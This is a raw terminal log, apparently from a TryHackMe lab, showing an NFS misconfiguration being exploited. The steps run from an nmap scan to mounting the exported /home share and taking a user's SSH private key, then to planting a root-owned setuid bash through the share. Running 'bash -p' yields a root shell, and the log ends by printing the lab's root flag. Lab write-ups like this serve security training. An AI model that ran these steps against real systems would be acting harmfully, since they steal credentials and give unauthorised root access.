
### nmap
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo nmap -Pn -T4 -A --open -p- 10.10.200.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 14:39 JST
Nmap scan report for 10.10.200.36
Host is up (0.30s latency).
Not shown: 65510 closed tcp ports (reset), 18 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30
:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34947/tcp6  mountd
|   100005  1,2,3      45459/udp6  mountd
|   100005  1,2,3      49816/udp   mountd
|   100005  1,2,3      59093/tcp   mountd
|   100021  1,3,4      33427/tcp   nlockmgr
|   100021  1,3,4      36505/udp   nlockmgr
|   100021  1,3,4      41905/udp6  nlockmgr
|   100021  1,3,4      45121/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
33427/tcp open  nlockmgr 1-4 (RPC #100021)
49849/tcp open  mountd   1-3 (RPC #100005)
55961/tcp open  mountd   1-3 (RPC #100005)
59093/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/9%OT=22%CT=1%CU=42757%PV=Y%DS=5%DC=T%G=Y%TM=672E
OS:F614%P=aarch64-unknown-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%
OS:TS=A)SEQ(SP=FF%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M
OS:508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN
OS:(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F50
OS:7%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
OS:R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   166.90 ms 10.17.0.1
2   ... 4
5   288.53 ms 10.10.200.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.54 seconds
```

### mount
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo nmap -Pn -T4 -A --open -p- 10.10.115.14
[sudo] password for yuu:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 17:30 JST
Nmap scan report for 10.10.115.14
Host is up (0.30s latency).
Not shown: 65525 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35757/tcp   mountd
|   100005  1,2,3      48422/udp   mountd
|   100005  1,2,3      52307/tcp6  mountd
|   100005  1,2,3      54279/udp6  mountd
|   100021  1,3,4      34126/udp6  nlockmgr
|   100021  1,3,4      38477/udp   nlockmgr
|   100021  1,3,4      39453/tcp6  nlockmgr
|   100021  1,3,4      46479/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
35757/tcp open  mountd   1-3 (RPC #100005)
36759/tcp open  mountd   1-3 (RPC #100005)
46479/tcp open  nlockmgr 1-4 (RPC #100021)
51819/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/9%OT=22%CT=1%CU=41996%PV=Y%DS=5%DC=T%G=Y%TM=672F
OS:1E3B%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O
OS:5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6
OS:=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   183.44 ms 10.17.0.1
2   ... 4
5   310.80 ms 10.10.115.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.84 seconds

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ showmount -e 10.10.115.14
Export list for 10.10.115.14:
/home *

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ mkdir /tmp/mount

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo mount 10.10.115.14:/home /tmp/mount

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls /tmp/mount
cappucino

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cd /tmp/mount/cappucino

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ scp -i /tmp/mount/cappucino/.ssh/id_rsa 10.10.115.14:/bin/bash
usage: scp [-346ABCOpqRrsTv] [-c cipher] [-D sftp_server_path] [-F ssh_config]
           [-i identity_file] [-J destination] [-l limit] [-o ssh_option]
           [-P port] [-S program] [-X sftp_option] source ... target

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cp /tmp/mount/cappucino/.ssh/id_rsa .

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls
ftp.txt  id_rsa  nmap2.txt  nmap3.txt  nmap.txt  nmap_vuln.txt  PUBLIC_NOTICE.txt

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ scp -i id_rsa capuchino10.10.115.14:/bin/bash
usage: scp [-346ABCOpqRrsTv] [-c cipher] [-D sftp_server_path] [-F ssh_config]
           [-i identity_file] [-J destination] [-l limit] [-o ssh_option]
           [-P port] [-S program] [-X sftp_option] source ... target

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ scp -i id_rsa capuchino@10.10.115.14:/bin/bash .
Connection closed by 10.10.115.14 port 22
scp: Connection closed

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo scp -i id_rsa capuchino@10.10.115.14:/bin/bash .
[sudo] password for yuu:
The authenticity of host '10.10.115.14 (10.10.115.14)' can't be established.
ED25519 key fingerprint is SHA256:KJ8GpDRYCTgSot8NqCbqRhNYCUarQAXuwbVuII32x/U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.115.14' (ED25519) to the list of known hosts.
Connection closed by 10.10.115.14 port 22
scp: Connection closed

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls
ftp.txt  id_rsa  nmap2.txt  nmap3.txt  nmap.txt  nmap_vuln.txt  PUBLIC_NOTICE.txt

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo scp -i id_rsa cappuchino@10.10.115.14:/bin/bash .
Connection closed by 10.10.115.14 port 22
scp: Connection closed

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo scp -i id_rsa cappucino@10.10.115.14:/bin/bash .
bash                                                                                                                    100% 1087KB 113.7KB/s   00:09

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls
bash  ftp.txt  id_rsa  nmap2.txt  nmap3.txt  nmap.txt  nmap_vuln.txt  PUBLIC_NOTICE.txt

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls -laF
total 1124
drwxrwxr-x 2 yuu  yuu     4096 Nov  9 18:07 ./
drwxrwxr-x 5 yuu  yuu     4096 Nov  7 06:18 ../
-rwxr-xr-x 1 root root 1113504 Nov  9 18:08 bash*
-rw-rw-r-- 1 yuu  yuu       26 Apr 24  2020 ftp.txt
-rw------- 1 yuu  yuu     1679 Nov  9 18:04 id_rsa
-rw-rw-r-- 1 yuu  yuu      136 Nov  7 21:04 nmap2.txt
-rw-rw-r-- 1 yuu  yuu        0 Nov  7 21:58 nmap3.txt
-rw-rw-r-- 1 yuu  yuu      785 Nov  7 06:19 nmap.txt
-rw-rw-r-- 1 yuu  yuu     5824 Nov  7 06:23 nmap_vuln.txt
-rw-rw-r-- 1 yuu  yuu      353 Apr 24  2020 PUBLIC_NOTICE.txt

cappucino@polonfs:~$ pwd
/home/cappucino
cappucino@polonfs:~$ logout
Connection to 10.10.115.14 closed.

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls -laF
total 1124
drwxrwxr-x 2 yuu  yuu     4096 Nov  9 18:07 ./
drwxrwxr-x 5 yuu  yuu     4096 Nov  7 06:18 ../
-rwsr-sr-x 1 root root 1113504 Nov  9 18:08 bash*
-rw-rw-r-- 1 yuu  yuu       26 Apr 24  2020 ftp.txt
-rw------- 1 yuu  yuu     1679 Nov  9 18:04 id_rsa
-rw-rw-r-- 1 yuu  yuu      136 Nov  7 21:04 nmap2.txt
-rw-rw-r-- 1 yuu  yuu        0 Nov  7 21:58 nmap3.txt
-rw-rw-r-- 1 yuu  yuu      785 Nov  7 06:19 nmap.txt
-rw-rw-r-- 1 yuu  yuu     5824 Nov  7 06:23 nmap_vuln.txt
-rw-rw-r-- 1 yuu  yuu      353 Apr 24  2020 PUBLIC_NOTICE.txt

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cp bash /tmp/mount/cappucino

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cd /tmp/mount/cappucino

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ ls -laF
total 1124
drwxr-xr-x 5 yuu  yuu     4096 Nov  9 18:39 ./
drwxr-xr-x 3 root root    4096 Apr 22  2020 ../
-rwxr-xr-x 1 yuu  yuu  1113504 Nov  9 18:39 bash*
-rw------- 1 yuu  yuu      112 Nov  9 18:38 .bash_history
-rw-r--r-- 1 yuu  yuu      220 Apr  5  2018 .bash_logout
-rw-r--r-- 1 yuu  yuu     3771 Apr  5  2018 .bashrc
drwx------ 2 yuu  yuu     4096 Apr 22  2020 .cache/
drwx------ 3 yuu  yuu     4096 Apr 22  2020 .gnupg/
-rw-r--r-- 1 yuu  yuu      807 Apr  5  2018 .profile
drwx------ 2 yuu  yuu     4096 Apr 22  2020 .ssh/
-rw-r--r-- 1 yuu  yuu        0 Apr 22  2020 .sudo_as_admin_successful

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chown root:root bash
[sudo] password for yuu:

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ ls
bash

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ ls -laF
total 1124
drwxr-xr-x 5 yuu  yuu     4096 Nov  9 18:39 ./
drwxr-xr-x 3 root root    4096 Apr 22  2020 ../
-rwxr-xr-x 1 root root 1113504 Nov  9 18:39 bash*
-rw------- 1 yuu  yuu      112 Nov  9 18:38 .bash_history
-rw-r--r-- 1 yuu  yuu      220 Apr  5  2018 .bash_logout
-rw-r--r-- 1 yuu  yuu     3771 Apr  5  2018 .bashrc
drwx------ 2 yuu  yuu     4096 Apr 22  2020 .cache/
drwx------ 3 yuu  yuu     4096 Apr 22  2020 .gnupg/
-rw-r--r-- 1 yuu  yuu      807 Apr  5  2018 .profile
drwx------ 2 yuu  yuu     4096 Apr 22  2020 .ssh/
-rw-r--r-- 1 yuu  yuu        0 Apr 22  2020 .sudo_as_admin_successful

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chmod +s bash

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ ls -laF
total 1124
drwxr-xr-x 5 yuu  yuu     4096 Nov  9 18:39 ./
drwxr-xr-x 3 root root    4096 Apr 22  2020 ../
-rwsr-sr-x 1 root root 1113504 Nov  9 18:39 bash*
-rw------- 1 yuu  yuu      112 Nov  9 18:38 .bash_history
-rw-r--r-- 1 yuu  yuu      220 Apr  5  2018 .bash_logout
-rw-r--r-- 1 yuu  yuu     3771 Apr  5  2018 .bashrc
drwx------ 2 yuu  yuu     4096 Apr 22  2020 .cache/
drwx------ 3 yuu  yuu     4096 Apr 22  2020 .gnupg/
-rw-r--r-- 1 yuu  yuu      807 Apr  5  2018 .profile
drwx------ 2 yuu  yuu     4096 Apr 22  2020 .ssh/
-rw-r--r-- 1 yuu  yuu        0 Apr 22  2020 .sudo_as_admin_successful

┌──(yuu㉿kali)-[/tmp/mount/cappucino]
└─$ ssh -i ./.ssh/id_rsa cappucino@10.10.115.14
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  9 09:42:01 UTC 2024

  System load:  0.0               Processes:           101
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.115.14
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Nov  9 09:34:08 2024 from 10.17.21.16
cappucino@polonfs:~$ whoami
cappucino
cappucino@polonfs:~$ ./bash -p
bash-4.4# whoami
root
bash-4.4# ls -laF
total 1124
drwxr-xr-x 5 cappucino cappucino    4096 Nov  9 09:39 ./
drwxr-xr-x 3 root      root         4096 Apr 21  2020 ../
-rwsr-sr-x 1 root      root      1113504 Nov  9 09:39 bash*
-rw------- 1 cappucino cappucino     112 Nov  9 09:38 .bash_history
-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache/
drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg/
-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh/
-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful
bash-4.4# cd /root
bash-4.4# ls -laF
total 40
drwx------  5 root root 4096 Apr 22  2020 ./
drwxr-xr-x 24 root root 4096 Jun  4  2020 ../
-rw-------  1 root root    0 Apr 22  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 22  2020 .cache/
drwx------  3 root root 4096 Apr 22  2020 .gnupg/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   19 Apr 22  2020 root.txt
drwx------  2 root root 4096 Apr 21  2020 .ssh/
-rw-------  1 root root 6124 Apr 22  2020 .viminfo
bash-4.4# pwd
/root
bash-4.4# cat root.txt
THM{nfs_got_pwned}
```
